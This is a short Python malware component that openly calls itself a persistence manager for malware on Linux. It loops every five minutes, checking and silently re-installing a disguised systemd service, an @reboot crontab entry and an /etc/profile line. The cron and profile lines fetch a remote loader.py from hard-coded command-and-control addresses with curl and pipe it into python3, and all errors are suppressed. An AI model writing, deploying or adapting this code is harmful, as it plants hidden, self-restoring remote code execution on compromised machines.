
#!/usr/bin/env python3
"""
Persistence Manager - Ensures malware survives reboot
"""

import subprocess
import os
import time

class PersistenceManager:
    def __init__(self):
        self.c2_server = "http://192.168.1.151:8000"
    
    def check_all_persistence(self):
        """Verify all persistence mechanisms are active"""
        checks = [
            self.check_systemd_service(),
            self.check_cron_jobs(),
            self.check_profile_scripts(),
            self.check_rc_local()
        ]
        
        # If any failed, re-establish persistence
        if not all(checks):
            self.establish_persistence()
    
    def check_systemd_service(self):
        try:
            result = subprocess.run(['systemctl', 'is-active', 'network-monitor.service'], 
                                  capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def check_cron_jobs(self):
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            return 'loader.py' in result.stdout
        except:
            return False
    
    def check_profile_scripts(self):
        try:
            with open('/etc/profile', 'r') as f:
                if 'loader.py' in f.read():
                    return True
            return False
        except:
            return False
    
    def check_rc_local(self):
        try:
            if os.path.exists('/etc/rc.local'):
                with open('/etc/rc.local', 'r') as f:
                    return 'loader.py' in f.read()
            return False
        except:
            return False
    
    def establish_persistence(self):
        """Re-establish all persistence mechanisms"""
        scripts = [
            "systemctl enable network-monitor.service 2>/dev/null || true",
            "systemctl start network-monitor.service 2>/dev/null || true",
            "(crontab -l 2>/dev/null | grep -v 'loader.py'; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
            "echo 'curl -s http://192.168.1.151:8000/loader.py | python3 - &' >> /etc/profile"
        ]
        
        for script in scripts:
            try:
                subprocess.run(script, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
    
    def run(self):
        """Main persistence monitoring loop"""
        while True:
            self.check_all_persistence()
            time.sleep(300)  # Check every 5 minutes

if __name__ == "__main__":
    manager = PersistenceManager()
    manager.run()
